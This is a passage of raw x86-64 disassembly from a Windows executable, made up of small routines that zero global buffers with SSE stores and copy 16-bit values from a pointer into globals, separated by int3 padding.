   140008086:	e8 d3 93 ff ff       	call   0x14000145e
   14000808b:	cc                   	int3
   14000808c:	cc                   	int3
   14000808d:	cc                   	int3
   14000808e:	cc                   	int3
   14000808f:	cc                   	int3
   140008090:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008093:	0f 29 05 66 b3 2b 00 	movaps %xmm0,0x2bb366(%rip)        # 0x1402c3400
   14000809a:	0f 29 05 4f b3 2b 00 	movaps %xmm0,0x2bb34f(%rip)        # 0x1402c33f0
   1400080a1:	0f 29 05 38 b3 2b 00 	movaps %xmm0,0x2bb338(%rip)        # 0x1402c33e0
   1400080a8:	0f 29 05 21 b3 2b 00 	movaps %xmm0,0x2bb321(%rip)        # 0x1402c33d0
   1400080af:	0f 29 05 0a b3 2b 00 	movaps %xmm0,0x2bb30a(%rip)        # 0x1402c33c0
   1400080b6:	48 c7 05 4d b3 2b 00 	movq   $0x0,0x2bb34d(%rip)        # 0x1402c340e
   1400080bd:	00 00 00 00 
   1400080c1:	c3                   	ret
   1400080c2:	cc                   	int3
   1400080c3:	cc                   	int3
   1400080c4:	cc                   	int3
   1400080c5:	cc                   	int3
   1400080c6:	cc                   	int3
   1400080c7:	cc                   	int3
   1400080c8:	cc                   	int3
   1400080c9:	cc                   	int3
   1400080ca:	cc                   	int3
   1400080cb:	cc                   	int3
   1400080cc:	cc                   	int3
   1400080cd:	cc                   	int3
   1400080ce:	cc                   	int3
   1400080cf:	cc                   	int3
   1400080d0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400080d3:	0f 29 05 46 b3 2b 00 	movaps %xmm0,0x2bb346(%rip)        # 0x1402c3420
   1400080da:	48 c7 05 4b b3 2b 00 	movq   $0x0,0x2bb34b(%rip)        # 0x1402c3430
   1400080e1:	00 00 00 00 
   1400080e5:	c3                   	ret
   1400080e6:	cc                   	int3
   1400080e7:	cc                   	int3
   1400080e8:	cc                   	int3
   1400080e9:	cc                   	int3
   1400080ea:	cc                   	int3
   1400080eb:	cc                   	int3
   1400080ec:	cc                   	int3
   1400080ed:	cc                   	int3
   1400080ee:	cc                   	int3
   1400080ef:	cc                   	int3
   1400080f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400080f3:	0f 29 05 46 b3 2b 00 	movaps %xmm0,0x2bb346(%rip)        # 0x1402c3440
   1400080fa:	c7 05 4c b3 2b 00 00 	movl   $0x0,0x2bb34c(%rip)        # 0x1402c3450
   140008101:	00 00 00 
   140008104:	c3                   	ret
   140008105:	cc                   	int3
   140008106:	cc                   	int3
   140008107:	cc                   	int3
   140008108:	cc                   	int3
   140008109:	cc                   	int3
   14000810a:	cc                   	int3
   14000810b:	cc                   	int3
   14000810c:	cc                   	int3
   14000810d:	cc                   	int3
   14000810e:	cc                   	int3
   14000810f:	cc                   	int3
   140008110:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008113:	0f 11 05 84 b3 2b 00 	movups %xmm0,0x2bb384(%rip)        # 0x1402c349e
   14000811a:	0f 29 05 6f b3 2b 00 	movaps %xmm0,0x2bb36f(%rip)        # 0x1402c3490
   140008121:	0f 29 05 58 b3 2b 00 	movaps %xmm0,0x2bb358(%rip)        # 0x1402c3480
   140008128:	0f 29 05 41 b3 2b 00 	movaps %xmm0,0x2bb341(%rip)        # 0x1402c3470
   14000812f:	0f 29 05 2a b3 2b 00 	movaps %xmm0,0x2bb32a(%rip)        # 0x1402c3460
   140008136:	c3                   	ret
   140008137:	cc                   	int3
   140008138:	cc                   	int3
   140008139:	cc                   	int3
   14000813a:	cc                   	int3
   14000813b:	cc                   	int3
   14000813c:	cc                   	int3
   14000813d:	cc                   	int3
   14000813e:	cc                   	int3
   14000813f:	cc                   	int3
   140008140:	c6 05 ad b3 2b 00 01 	movb   $0x1,0x2bb3ad(%rip)        # 0x1402c34f4
   140008147:	0f b7 01             	movzwl (%rcx),%eax
   14000814a:	66 89 05 5f b3 2b 00 	mov    %ax,0x2bb35f(%rip)        # 0x1402c34b0
   140008151:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008155:	66 89 05 56 b3 2b 00 	mov    %ax,0x2bb356(%rip)        # 0x1402c34b2
   14000815c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008160:	66 89 05 4d b3 2b 00 	mov    %ax,0x2bb34d(%rip)        # 0x1402c34b4
   140008167:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000816b:	66 89 05 44 b3 2b 00 	mov    %ax,0x2bb344(%rip)        # 0x1402c34b6
   140008172:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008176:	66 89 05 3b b3 2b 00 	mov    %ax,0x2bb33b(%rip)        # 0x1402c34b8
   14000817d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008181:	66 89 05 32 b3 2b 00 	mov    %ax,0x2bb332(%rip)        # 0x1402c34ba
   140008188:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000818c:	66 89 05 29 b3 2b 00 	mov    %ax,0x2bb329(%rip)        # 0x1402c34bc
   140008193:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008197:	66 89 05 20 b3 2b 00 	mov    %ax,0x2bb320(%rip)        # 0x1402c34be
   14000819e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400081a2:	66 89 05 17 b3 2b 00 	mov    %ax,0x2bb317(%rip)        # 0x1402c34c0
   1400081a9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400081ad:	66 89 05 0e b3 2b 00 	mov    %ax,0x2bb30e(%rip)        # 0x1402c34c2
   1400081b4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400081b8:	66 89 05 05 b3 2b 00 	mov    %ax,0x2bb305(%rip)        # 0x1402c34c4
   1400081bf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400081c3:	66 89 05 fc b2 2b 00 	mov    %ax,0x2bb2fc(%rip)        # 0x1402c34c6
   1400081ca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400081ce:	66 89 05 f3 b2 2b 00 	mov    %ax,0x2bb2f3(%rip)        # 0x1402c34c8
   1400081d5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400081d9:	66 89 05 ea b2 2b 00 	mov    %ax,0x2bb2ea(%rip)        # 0x1402c34ca
   1400081e0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400081e4:	66 89 05 e1 b2 2b 00 	mov    %ax,0x2bb2e1(%rip)        # 0x1402c34cc
   1400081eb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400081ef:	66 89 05 d8 b2 2b 00 	mov    %ax,0x2bb2d8(%rip)        # 0x1402c34ce
   1400081f6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400081fa:	66 89 05 cf b2 2b 00 	mov    %ax,0x2bb2cf(%rip)        # 0x1402c34d0
   140008201:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008205:	66 89 05 c6 b2 2b 00 	mov    %ax,0x2bb2c6(%rip)        # 0x1402c34d2
   14000820c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008210:	66 89 05 bd b2 2b 00 	mov    %ax,0x2bb2bd(%rip)        # 0x1402c34d4
   140008217:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000821b:	66 89 05 b4 b2 2b 00 	mov    %ax,0x2bb2b4(%rip)        # 0x1402c34d6
   140008222:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008226:	66 89 05 ab b2 2b 00 	mov    %ax,0x2bb2ab(%rip)        # 0x1402c34d8
   14000822d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008231:	66 89 05 a2 b2 2b 00 	mov    %ax,0x2bb2a2(%rip)        # 0x1402c34da
   140008238:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000823c:	66 89 05 99 b2 2b 00 	mov    %ax,0x2bb299(%rip)        # 0x1402c34dc
   140008243:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008247:	66 89 05 90 b2 2b 00 	mov    %ax,0x2bb290(%rip)        # 0x1402c34de
   14000824e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008252:	66 89 05 87 b2 2b 00 	mov    %ax,0x2bb287(%rip)        # 0x1402c34e0
   140008259:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000825d:	66 89 05 7e b2 2b 00 	mov    %ax,0x2bb27e(%rip)        # 0x1402c34e2
   140008264:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008268:	66 89 05 75 b2 2b 00 	mov    %ax,0x2bb275(%rip)        # 0x1402c34e4
   14000826f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008273:	66 89 05 6c b2 2b 00 	mov    %ax,0x2bb26c(%rip)        # 0x1402c34e6
   14000827a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   14000827e:	66 89 05 63 b2 2b 00 	mov    %ax,0x2bb263(%rip)        # 0x1402c34e8
   140008285:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008289:	66 89 05 5a b2 2b 00 	mov    %ax,0x2bb25a(%rip)        # 0x1402c34ea
   140008290:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140008294:	66 89 05 51 b2 2b 00 	mov    %ax,0x2bb251(%rip)        # 0x1402c34ec
   14000829b:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   14000829f:	66 89 05 48 b2 2b 00 	mov    %ax,0x2bb248(%rip)        # 0x1402c34ee
   1400082a6:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   1400082aa:	66 89 05 3f b2 2b 00 	mov    %ax,0x2bb23f(%rip)        # 0x1402c34f0
   1400082b1:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   1400082b5:	66 89 05 36 b2 2b 00 	mov    %ax,0x2bb236(%rip)        # 0x1402c34f2
   1400082bc:	c3                   	ret
   1400082bd:	cc                   	int3
   1400082be:	cc                   	int3
   1400082bf:	cc                   	int3
   1400082c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400082c3:	0f 29 05 16 b2 2b 00 	movaps %xmm0,0x2bb216(%rip)        # 0x1402c34e0
   1400082ca:	0f 29 05 ff b1 2b 00 	movaps %xmm0,0x2bb1ff(%rip)        # 0x1402c34d0
   1400082d1:	0f 29 05 e8 b1 2b 00 	movaps %xmm0,0x2bb1e8(%rip)        # 0x1402c34c0
   1400082d8:	0f 29 05 d1 b1 2b 00 	movaps %xmm0,0x2bb1d1(%rip)        # 0x1402c34b0
   1400082df:	c7 05 07 b2 2b 00 00 	movl   $0x0,0x2bb207(%rip)        # 0x1402c34f0
   1400082e6:	00 00 00 
   1400082e9:	c3                   	ret
   1400082ea:	cc                   	int3
   1400082eb:	cc                   	int3
   1400082ec:	cc                   	int3
   1400082ed:	cc                   	int3
   1400082ee:	cc                   	int3
   1400082ef:	cc                   	int3
   1400082f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400082f3:	0f 11 05 10 b2 2b 00 	movups %xmm0,0x2bb210(%rip)        # 0x1402c350a
   1400082fa:	0f 29 05 ff b1 2b 00 	movaps %xmm0,0x2bb1ff(%rip)        # 0x1402c3500
   140008301:	c3                   	ret
   140008302:	cc                   	int3
   140008303:	cc                   	int3
   140008304:	cc                   	int3
   140008305:	cc                   	int3
   140008306:	cc                   	int3
   140008307:	cc                   	int3
   140008308:	cc                   	int3
   140008309:	cc                   	int3
   14000830a:	cc                   	int3
   14000830b:	cc                   	int3
   14000830c:	cc                   	int3
   14000830d:	cc                   	int3
   14000830e:	cc                   	int3
   14000830f:	cc                   	int3
   140008310:	c6 05 47 b2 2b 00 01 	movb   $0x1,0x2bb247(%rip)        # 0x1402c355e
   140008317:	0f b7 01             	movzwl (%rcx),%eax
   14000831a:	66 89 05 ff b1 2b 00 	mov    %ax,0x2bb1ff(%rip)        # 0x1402c3520
   140008321:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008325:	66 89 05 f6 b1 2b 00 	mov    %ax,0x2bb1f6(%rip)        # 0x1402c3522
   14000832c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008330:	66 89 05 ed b1 2b 00 	mov    %ax,0x2bb1ed(%rip)        # 0x1402c3524
   140008337:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000833b:	66 89 05 e4 b1 2b 00 	mov    %ax,0x2bb1e4(%rip)        # 0x1402c3526
   140008342:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008346:	66 89 05 db b1 2b 00 	mov    %ax,0x2bb1db(%rip)        # 0x1402c3528
   14000834d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008351:	66 89 05 d2 b1 2b 00 	mov    %ax,0x2bb1d2(%rip)        # 0x1402c352a
   140008358:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000835c:	66 89 05 c9 b1 2b 00 	mov    %ax,0x2bb1c9(%rip)        # 0x1402c352c
   140008363:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008367:	66 89 05 c0 b1 2b 00 	mov    %ax,0x2bb1c0(%rip)        # 0x1402c352e
   14000836e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008372:	66 89 05 b7 b1 2b 00 	mov    %ax,0x2bb1b7(%rip)        # 0x1402c3530
   140008379:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000837d:	66 89 05 ae b1 2b 00 	mov    %ax,0x2bb1ae(%rip)        # 0x1402c3532
   140008384:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008388:	66 89 05 a5 b1 2b 00 	mov    %ax,0x2bb1a5(%rip)        # 0x1402c3534
   14000838f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008393:	66 89 05 9c b1 2b 00 	mov    %ax,0x2bb19c(%rip)        # 0x1402c3536
   14000839a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000839e:	66 89 05 93 b1 2b 00 	mov    %ax,0x2bb193(%rip)        # 0x1402c3538
   1400083a5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400083a9:	66 89 05 8a b1 2b 00 	mov    %ax,0x2bb18a(%rip)        # 0x1402c353a
   1400083b0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400083b4:	66 89 05 81 b1 2b 00 	mov    %ax,0x2bb181(%rip)        # 0x1402c353c
   1400083bb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400083bf:	66 89 05 78 b1 2b 00 	mov    %ax,0x2bb178(%rip)        # 0x1402c353e
   1400083c6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400083ca:	66 89 05 6f b1 2b 00 	mov    %ax,0x2bb16f(%rip)        # 0x1402c3540
   1400083d1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400083d5:	66 89 05 66 b1 2b 00 	mov    %ax,0x2bb166(%rip)        # 0x1402c3542
   1400083dc:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400083e0:	66 89 05 5d b1 2b 00 	mov    %ax,0x2bb15d(%rip)        # 0x1402c3544
   1400083e7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400083eb:	66 89 05 54 b1 2b 00 	mov    %ax,0x2bb154(%rip)        # 0x1402c3546
   1400083f2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400083f6:	66 89 05 4b b1 2b 00 	mov    %ax,0x2bb14b(%rip)        # 0x1402c3548
   1400083fd:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008401:	66 89 05 42 b1 2b 00 	mov    %ax,0x2bb142(%rip)        # 0x1402c354a
   140008408:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000840c:	66 89 05 39 b1 2b 00 	mov    %ax,0x2bb139(%rip)        # 0x1402c354c
   140008413:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008417:	66 89 05 30 b1 2b 00 	mov    %ax,0x2bb130(%rip)        # 0x1402c354e
   14000841e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008422:	66 89 05 27 b1 2b 00 	mov    %ax,0x2bb127(%rip)        # 0x1402c3550
   140008429:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000842d:	66 89 05 1e b1 2b 00 	mov    %ax,0x2bb11e(%rip)        # 0x1402c3552
   140008434:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008438:	66 89 05 15 b1 2b 00 	mov    %ax,0x2bb115(%rip)        # 0x1402c3554
   14000843f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008443:	66 89 05 0c b1 2b 00 	mov    %ax,0x2bb10c(%rip)        # 0x1402c3556
   14000844a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   14000844e:	66 89 05 03 b1 2b 00 	mov    %ax,0x2bb103(%rip)        # 0x1402c3558
   140008455:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008459:	66 89 05 fa b0 2b 00 	mov    %ax,0x2bb0fa(%rip)        # 0x1402c355a
   140008460:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140008464:	66 89 05 f1 b0 2b 00 	mov    %ax,0x2bb0f1(%rip)        # 0x1402c355c
   14000846b:	c3                   	ret
   14000846c:	cc                   	int3
   14000846d:	cc                   	int3
   14000846e:	cc                   	int3
   14000846f:	cc                   	int3
   140008470:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008473:	0f 11 05 d4 b0 2b 00 	movups %xmm0,0x2bb0d4(%rip)        # 0x1402c354e
   14000847a:	0f 11 05 bf b0 2b 00 	movups %xmm0,0x2bb0bf(%rip)        # 0x1402c3540
   140008481:	0f 11 05 a8 b0 2b 00 	movups %xmm0,0x2bb0a8(%rip)        # 0x1402c3530
   140008488:	0f 11 05 91 b0 2b 00 	movups %xmm0,0x2bb091(%rip)        # 0x1402c3520
   14000848f:	c3                   	ret
   140008490:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008493:	0f 29 05 c6 b0 2b 00 	movaps %xmm0,0x2bb0c6(%rip)        # 0x1402c3560
   14000849a:	66 c7 05 cd b0 2b 00 	movw   $0x0,0x2bb0cd(%rip)        # 0x1402c3570
   1400084a1:	00 00 
   1400084a3:	c3                   	ret
   1400084a4:	cc                   	int3
   1400084a5:	cc                   	int3
   1400084a6:	cc                   	int3
   1400084a7:	cc                   	int3
   1400084a8:	cc                   	int3
   1400084a9:	cc                   	int3
   1400084aa:	cc                   	int3
   1400084ab:	cc                   	int3
   1400084ac:	cc                   	int3
   1400084ad:	cc                   	int3
   1400084ae:	cc                   	int3
   1400084af:	cc                   	int3
   1400084b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400084b3:	0f 29 05 c6 b0 2b 00 	movaps %xmm0,0x2bb0c6(%rip)        # 0x1402c3580
   1400084ba:	48 c7 05 cb b0 2b 00 	movq   $0x0,0x2bb0cb(%rip)        # 0x1402c3590
   1400084c1:	00 00 00 00 
   1400084c5:	c3                   	ret
   1400084c6:	cc                   	int3
   1400084c7:	cc                   	int3
   1400084c8:	cc                   	int3
   1400084c9:	cc                   	int3
   1400084ca:	cc                   	int3
   1400084cb:	cc                   	int3
   1400084cc:	cc                   	int3
   1400084cd:	cc                   	int3
   1400084ce:	cc                   	int3
   1400084cf:	cc                   	int3
   1400084d0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400084d3:	0f 29 05 c6 b0 2b 00 	movaps %xmm0,0x2bb0c6(%rip)        # 0x1402c35a0
   1400084da:	c3                   	ret
   1400084db:	cc                   	int3
   1400084dc:	cc                   	int3
   1400084dd:	cc                   	int3
   1400084de:	cc                   	int3
   1400084df:	cc                   	int3
   1400084e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400084e3:	0f 29 05 96 b1 2b 00 	movaps %xmm0,0x2bb196(%rip)        # 0x1402c3680
   1400084ea:	0f 29 05 7f b1 2b 00 	movaps %xmm0,0x2bb17f(%rip)        # 0x1402c3670
   1400084f1:	0f 29 05 68 b1 2b 00 	movaps %xmm0,0x2bb168(%rip)        # 0x1402c3660
   1400084f8:	0f 29 05 51 b1 2b 00 	movaps %xmm0,0x2bb151(%rip)        # 0x1402c3650
   1400084ff:	0f 29 05 3a b1 2b 00 	movaps %xmm0,0x2bb13a(%rip)        # 0x1402c3640
   140008506:	0f 29 05 23 b1 2b 00 	movaps %xmm0,0x2bb123(%rip)        # 0x1402c3630
   14000850d:	0f 29 05 0c b1 2b 00 	movaps %xmm0,0x2bb10c(%rip)        # 0x1402c3620
   140008514:	0f 29 05 f5 b0 2b 00 	movaps %xmm0,0x2bb0f5(%rip)        # 0x1402c3610
   14000851b:	0f 29 05 de b0 2b 00 	movaps %xmm0,0x2bb0de(%rip)        # 0x1402c3600
   140008522:	0f 29 05 c7 b0 2b 00 	movaps %xmm0,0x2bb0c7(%rip)        # 0x1402c35f0
   140008529:	0f 29 05 b0 b0 2b 00 	movaps %xmm0,0x2bb0b0(%rip)        # 0x1402c35e0
   140008530:	0f 29 05 99 b0 2b 00 	movaps %xmm0,0x2bb099(%rip)        # 0x1402c35d0
   140008537:	0f 29 05 82 b0 2b 00 	movaps %xmm0,0x2bb082(%rip)        # 0x1402c35c0
   14000853e:	48 c7 05 45 b1 2b 00 	movq   $0x0,0x2bb145(%rip)        # 0x1402c368e
   140008545:	00 00 00 00 
   140008549:	c3                   	ret
   14000854a:	cc                   	int3
   14000854b:	cc                   	int3
   14000854c:	cc                   	int3
   14000854d:	cc                   	int3
   14000854e:	cc                   	int3
   14000854f:	cc                   	int3
   140008550:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008553:	0f 29 05 96 b1 2b 00 	movaps %xmm0,0x2bb196(%rip)        # 0x1402c36f0
   14000855a:	0f 29 05 7f b1 2b 00 	movaps %xmm0,0x2bb17f(%rip)        # 0x1402c36e0
   140008561:	0f 29 05 68 b1 2b 00 	movaps %xmm0,0x2bb168(%rip)        # 0x1402c36d0
   140008568:	0f 29 05 51 b1 2b 00 	movaps %xmm0,0x2bb151(%rip)        # 0x1402c36c0
   14000856f:	0f 29 05 3a b1 2b 00 	movaps %xmm0,0x2bb13a(%rip)        # 0x1402c36b0
   140008576:	0f 29 05 23 b1 2b 00 	movaps %xmm0,0x2bb123(%rip)        # 0x1402c36a0
   14000857d:	48 c7 05 76 b1 2b 00 	movq   $0x0,0x2bb176(%rip)        # 0x1402c36fe
   140008584:	00 00 00 00 
   140008588:	c3                   	ret
   140008589:	cc                   	int3
   14000858a:	cc                   	int3
   14000858b:	cc                   	int3
   14000858c:	cc                   	int3
   14000858d:	cc                   	int3
   14000858e:	cc                   	int3
   14000858f:	cc                   	int3
   140008590:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008593:	0f 29 05 76 b1 2b 00 	movaps %xmm0,0x2bb176(%rip)        # 0x1402c3710
   14000859a:	66 c7 05 7d b1 2b 00 	movw   $0x0,0x2bb17d(%rip)        # 0x1402c3720
   1400085a1:	00 00 
   1400085a3:	c3                   	ret
   1400085a4:	cc                   	int3
   1400085a5:	cc                   	int3
   1400085a6:	cc                   	int3
   1400085a7:	cc                   	int3
   1400085a8:	cc                   	int3
   1400085a9:	cc                   	int3
   1400085aa:	cc                   	int3
   1400085ab:	cc                   	int3
   1400085ac:	cc                   	int3
   1400085ad:	cc                   	int3
   1400085ae:	cc                   	int3
   1400085af:	cc                   	int3
   1400085b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400085b3:	0f 29 05 c6 b1 2b 00 	movaps %xmm0,0x2bb1c6(%rip)        # 0x1402c3780
   1400085ba:	0f 29 05 af b1 2b 00 	movaps %xmm0,0x2bb1af(%rip)        # 0x1402c3770
   1400085c1:	0f 29 05 98 b1 2b 00 	movaps %xmm0,0x2bb198(%rip)        # 0x1402c3760
   1400085c8:	0f 29 05 81 b1 2b 00 	movaps %xmm0,0x2bb181(%rip)        # 0x1402c3750
   1400085cf:	0f 29 05 6a b1 2b 00 	movaps %xmm0,0x2bb16a(%rip)        # 0x1402c3740
   1400085d6:	0f 29 05 53 b1 2b 00 	movaps %xmm0,0x2bb153(%rip)        # 0x1402c3730
   1400085dd:	c7 05 a9 b1 2b 00 00 	movl   $0x0,0x2bb1a9(%rip)        # 0x1402c3790
   1400085e4:	00 00 00 
   1400085e7:	c3                   	ret
   1400085e8:	cc                   	int3
   1400085e9:	cc                   	int3
   1400085ea:	cc                   	int3
   1400085eb:	cc                   	int3
   1400085ec:	cc                   	int3
   1400085ed:	cc                   	int3
   1400085ee:	cc                   	int3
   1400085ef:	cc                   	int3
   1400085f0:	c6 05 d3 b1 2b 00 01 	movb   $0x1,0x2bb1d3(%rip)        # 0x1402c37ca
   1400085f7:	0f b7 01             	movzwl (%rcx),%eax
   1400085fa:	66 89 05 9f b1 2b 00 	mov    %ax,0x2bb19f(%rip)        # 0x1402c37a0
   140008601:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008605:	66 89 05 96 b1 2b 00 	mov    %ax,0x2bb196(%rip)        # 0x1402c37a2
   14000860c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008610:	66 89 05 8d b1 2b 00 	mov    %ax,0x2bb18d(%rip)        # 0x1402c37a4
   140008617:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000861b:	66 89 05 84 b1 2b 00 	mov    %ax,0x2bb184(%rip)        # 0x1402c37a6
   140008622:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008626:	66 89 05 7b b1 2b 00 	mov    %ax,0x2bb17b(%rip)        # 0x1402c37a8
   14000862d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008631:	66 89 05 72 b1 2b 00 	mov    %ax,0x2bb172(%rip)        # 0x1402c37aa
   140008638:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000863c:	66 89 05 69 b1 2b 00 	mov    %ax,0x2bb169(%rip)        # 0x1402c37ac
   140008643:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008647:	66 89 05 60 b1 2b 00 	mov    %ax,0x2bb160(%rip)        # 0x1402c37ae
   14000864e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008652:	66 89 05 57 b1 2b 00 	mov    %ax,0x2bb157(%rip)        # 0x1402c37b0
   140008659:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000865d:	66 89 05 4e b1 2b 00 	mov    %ax,0x2bb14e(%rip)        # 0x1402c37b2
   140008664:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008668:	66 89 05 45 b1 2b 00 	mov    %ax,0x2bb145(%rip)        # 0x1402c37b4
   14000866f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008673:	66 89 05 3c b1 2b 00 	mov    %ax,0x2bb13c(%rip)        # 0x1402c37b6
   14000867a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000867e:	66 89 05 33 b1 2b 00 	mov    %ax,0x2bb133(%rip)        # 0x1402c37b8
   140008685:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008689:	66 89 05 2a b1 2b 00 	mov    %ax,0x2bb12a(%rip)        # 0x1402c37ba
   140008690:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008694:	66 89 05 21 b1 2b 00 	mov    %ax,0x2bb121(%rip)        # 0x1402c37bc
   14000869b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000869f:	66 89 05 18 b1 2b 00 	mov    %ax,0x2bb118(%rip)        # 0x1402c37be
   1400086a6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400086aa:	66 89 05 0f b1 2b 00 	mov    %ax,0x2bb10f(%rip)        # 0x1402c37c0
   1400086b1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400086b5:	66 89 05 06 b1 2b 00 	mov    %ax,0x2bb106(%rip)        # 0x1402c37c2
   1400086bc:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400086c0:	66 89 05 fd b0 2b 00 	mov    %ax,0x2bb0fd(%rip)        # 0x1402c37c4
   1400086c7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400086cb:	66 89 05 f4 b0 2b 00 	mov    %ax,0x2bb0f4(%rip)        # 0x1402c37c6
   1400086d2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400086d6:	66 89 05 eb b0 2b 00 	mov    %ax,0x2bb0eb(%rip)        # 0x1402c37c8
   1400086dd:	c3                   	ret
   1400086de:	cc                   	int3
   1400086df:	cc                   	int3
   1400086e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400086e3:	0f 11 05 d0 b0 2b 00 	movups %xmm0,0x2bb0d0(%rip)        # 0x1402c37ba
   1400086ea:	0f 29 05 bf b0 2b 00 	movaps %xmm0,0x2bb0bf(%rip)        # 0x1402c37b0
   1400086f1:	0f 29 05 a8 b0 2b 00 	movaps %xmm0,0x2bb0a8(%rip)        # 0x1402c37a0
   1400086f8:	c3                   	ret
   1400086f9:	cc                   	int3
   1400086fa:	cc                   	int3
   1400086fb:	cc                   	int3
   1400086fc:	cc                   	int3
   1400086fd:	cc                   	int3
   1400086fe:	cc                   	int3
   1400086ff:	cc                   	int3
   140008700:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008703:	0f 11 05 d4 b0 2b 00 	movups %xmm0,0x2bb0d4(%rip)        # 0x1402c37de
   14000870a:	0f 29 05 bf b0 2b 00 	movaps %xmm0,0x2bb0bf(%rip)        # 0x1402c37d0
   140008711:	c3                   	ret
   140008712:	cc                   	int3
   140008713:	cc                   	int3
   140008714:	cc                   	int3
   140008715:	cc                   	int3
   140008716:	cc                   	int3
   140008717:	cc                   	int3
   140008718:	cc                   	int3
